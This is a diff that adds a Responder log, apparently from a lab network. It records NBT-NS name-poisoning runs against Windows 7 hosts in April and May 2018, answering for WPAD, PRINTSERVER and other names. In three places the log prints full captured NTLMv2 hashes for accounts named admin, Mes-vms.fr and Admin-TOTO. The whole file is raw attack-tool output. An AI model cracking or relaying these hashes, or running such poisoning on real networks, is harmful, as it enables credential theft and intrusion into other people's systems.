@@ -1,0 +1,174 @@
+04/16/2018 01:50:06 PM - Responder Started: ['responder.exe', '-i', '192.168.0.20', '-wrf']
+04/16/2018 01:50:39 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name PRINTSERVER (service: Workstation/Redirector)
+04/16/2018 01:50:39 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 01:50:39 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 01:50:39 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.3.15 for name PRINTSERVER (service: Workstation/Redirector)
+04/16/2018 01:50:39 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 01:50:39 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 01:50:54 PM - [HTTP] NTLMv2 Client   : 192.168.0.20
+04/16/2018 01:50:54 PM - [HTTP] NTLMv2 Username : \admin
+04/16/2018 01:50:54 PM - [HTTP] NTLMv2 Hash     : admin:::1122334455667788:2F7EE41745ABC2B58BCBD556E1BF13BC:0101000000000000C8A5192D79D5D301B95A7206883AA617000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000000000000200000FEFA5544D66AEB358621648932F11A0E63E7F36248FB87AF16193B84EEBFF2EE0A001000000000000000000000000000000000000900200048005400540050002F007000720069006E0074007300650072007600650072000000000000000000
+04/16/2018 01:51:28 PM - Responder Started: ['responder.exe', '-i', '192.168.0.20', '-wrf']
+04/16/2018 02:15:59 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.3.15 for name PRINTSERVER (service: Workstation/Redirector)
+04/16/2018 02:15:59 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:15:59 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:15:59 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name PRINTSERVER (service: Workstation/Redirector)
+04/16/2018 02:15:59 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:15:59 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:16:10 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name USER-PC (service: Domain Controller)
+04/16/2018 02:16:10 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:16:10 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:21:08 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.3.15 for name WPAD (service: Workstation/Redirector)
+04/16/2018 02:21:08 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:21:08 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:21:08 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name WPAD (service: Workstation/Redirector)
+04/16/2018 02:21:08 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:21:08 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:24:49 PM - Responder Started: ['responder.exe', '-i', '192.168.0.20', '-wrf']
+04/16/2018 02:26:20 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name USER-PC (service: Domain Controller)
+04/16/2018 02:26:20 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:26:20 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:26:30 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.3.15 for name PRINTSERVER (service: Workstation/Redirector)
+04/16/2018 02:26:30 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:26:30 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:26:30 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name PRINTSERVER (service: Workstation/Redirector)
+04/16/2018 02:26:30 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:26:30 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:40:47 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.3.15 for name PRINTSERVER (service: Workstation/Redirector)
+04/16/2018 02:40:47 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:40:47 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:40:47 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name PRINTSERVER (service: Workstation/Redirector)
+04/16/2018 02:40:47 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:40:47 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:42:46 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name USER-PC (service: Domain Controller)
+04/16/2018 02:42:46 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:42:46 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:42:50 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.3.15 for name WPAD (service: Workstation/Redirector)
+04/16/2018 02:42:50 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:42:50 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:42:50 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name WPAD (service: Workstation/Redirector)
+04/16/2018 02:42:50 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:42:50 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:44:24 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name WORKGROUP (service: Domain Controller)
+04/16/2018 02:44:24 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:44:24 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:44:25 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name WORKGROUP (service: Domain Master Browser)
+04/16/2018 02:44:25 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:44:25 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:53:00 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.3.15 for name WPAD (service: Workstation/Redirector)
+04/16/2018 02:53:00 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:53:00 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:53:00 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name WPAD (service: Workstation/Redirector)
+04/16/2018 02:53:00 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:53:00 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:54:32 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name WORKGROUP (service: Domain Controller)
+04/16/2018 02:54:32 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:54:32 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:54:32 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name WORKGROUP (service: Domain Master Browser)
+04/16/2018 02:54:32 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:54:32 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 02:58:06 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name USER-PC (service: Domain Controller)
+04/16/2018 02:58:06 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 02:58:06 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 03:03:16 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.3.15 for name WPAD (service: Workstation/Redirector)
+04/16/2018 03:03:16 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 03:03:16 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 03:03:16 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name WPAD (service: Workstation/Redirector)
+04/16/2018 03:03:16 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 03:03:16 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 03:03:30 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.3.15 for name PRINTSERVER (service: Workstation/Redirector)
+04/16/2018 03:03:30 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 03:03:30 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+04/16/2018 03:03:30 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name PRINTSERVER (service: Workstation/Redirector)
+04/16/2018 03:03:30 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+04/16/2018 03:03:30 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 12:49:25 PM - Responder Started: ['Responder.exe', '-i', '192.168.0.20', '-wrf']
+05/19/2018 12:51:00 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.30 for name WPAD (service: Workstation/Redirector)
+05/19/2018 12:54:37 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.30 for name PRINTSERVER (service: Workstation/Redirector)
+05/19/2018 12:54:53 PM - [HTTP] NTLMv2 Client   : 192.168.0.30
+05/19/2018 12:54:53 PM - [HTTP] NTLMv2 Username : \admin
+05/19/2018 12:54:53 PM - [HTTP] NTLMv2 Hash     : admin:::1122334455667788:7528C709C49E557B2077EE40CA6BE9EF:0101000000000000270E79D05FEFD301E56C734745C73C6D000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000AAA7CABA60E38E2EC785F36551B9AE05BA818402B4AFC35C86E2D9C2950394B30A001000000000000000000000000000000000000900200048005400540050002F007000720069006E0074007300650072007600650072000000000000000000
+05/19/2018 12:56:38 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.30 for name USER-PC (service: File Server)
+05/19/2018 12:56:38 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 12:56:38 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 12:57:32 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.30 for name WPAD (service: Workstation/Redirector)
+05/19/2018 12:57:32 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 12:57:32 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 12:57:33 PM - [HTTP] NTLMv2 Client   : 192.168.0.30
+05/19/2018 12:57:33 PM - [HTTP] NTLMv2 Username : WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:57:33 PM - [HTTP] NTLMv2 Hash     : Mes-vms.fr::WIN-562V873OTU7:1122334455667788:5F29FECAB13A53A242218A3E19B65FCB:01010000000000009A12FC2F60EFD301B3EEB58727BEC255000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000AAA7CABA60E38E2EC785F36551B9AE05BA818402B4AFC35C86E2D9C2950394B30A001000000000000000000000000000000000000900220048005400540050002F003100390032002E003100360038002E0030002E00320030000000000000000000
+05/19/2018 12:57:37 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:57:37 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:57:39 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:57:39 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:57:42 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:57:42 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:57:44 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:57:44 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:18 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:18 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:22 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:22 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:26 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:26 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:29 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:29 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:33 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:33 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:37 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:37 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:41 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:41 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:44 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:44 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:48 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:48 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:52 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 12:58:52 PM - [*] Skipping previously captured hash for WIN-562V873OTU7\Mes-vms.fr
+05/19/2018 01:03:54 PM - [*] [NBT-NS] Poisoned answer sent to 192.168.0.20 for name WORKGROUP (service: Domain Master Browser)
+05/19/2018 01:03:54 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 01:03:54 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 01:25:16 PM - Responder Started: ['Responder.exe', '-i', '10.0.0.20', '-wrf']
+05/19/2018 01:25:54 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name WPAD (service: Workstation/Redirector)
+05/19/2018 01:25:54 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 01:25:54 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 01:26:44 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name WIN-562V873OTU7 (service: Domain Controller)
+05/19/2018 01:26:44 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 01:26:44 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 01:26:48 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name PRINTSERVER (service: Workstation/Redirector)
+05/19/2018 01:26:48 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 01:26:48 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 01:26:59 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name USER-PC (service: File Server)
+05/19/2018 01:26:59 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 01:26:59 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 01:38:25 PM - Responder Started: ['Responder.exe', '-i', '10.0.0.20', '-wrf']
+05/19/2018 01:38:31 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name PRINTSERVER (service: Workstation/Redirector)
+05/19/2018 01:38:31 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 01:38:31 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 01:38:31 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name PRINTSERVER (service: Workstation/Redirector)
+05/19/2018 01:38:31 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 01:38:31 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 01:38:44 PM - [HTTP] NTLMv2 Client   : 10.0.0.30
+05/19/2018 01:38:44 PM - [HTTP] NTLMv2 Username : \Admin-TOTO
+05/19/2018 01:38:44 PM - [HTTP] NTLMv2 Hash     : Admin-TOTO:::1122334455667788:506D1A1CFFF79744D7AA188FAC14ECEF:01010000000000009AB23AF165EFD301BD93BB06C089118B000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000AAA7CABA60E38E2EC785F36551B9AE05BA818402B4AFC35C86E2D9C2950394B30A001000000000000000000000000000000000000900200048005400540050002F007000720069006E0074007300650072007600650072000000000000000000
+05/19/2018 01:39:00 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name USER-PC (service: File Server)
+05/19/2018 01:39:00 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 01:39:00 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 01:51:00 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name USER-PC (service: File Server)
+05/19/2018 01:51:00 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 01:51:00 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 02:03:01 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name USER-PC (service: File Server)
+05/19/2018 02:03:01 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 02:03:01 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 02:15:01 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name USER-PC (service: File Server)
+05/19/2018 02:15:01 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 02:15:01 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 02:27:01 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name USER-PC (service: File Server)
+05/19/2018 02:27:01 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 02:27:01 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 02:39:02 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name USER-PC (service: File Server)
+05/19/2018 02:39:02 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 02:39:02 PM - [FINGER] Client Version : Windows 7 Professional 6.1
+05/19/2018 02:51:02 PM - [*] [NBT-NS] Poisoned answer sent to 10.0.0.30 for name USER-PC (service: File Server)
+05/19/2018 02:51:02 PM - [FINGER] OS Version     : Windows 7 Professional 7601 Service Pack 1
+05/19/2018 02:51:02 PM - [FINGER] Client Version : Windows 7 Professional 6.1
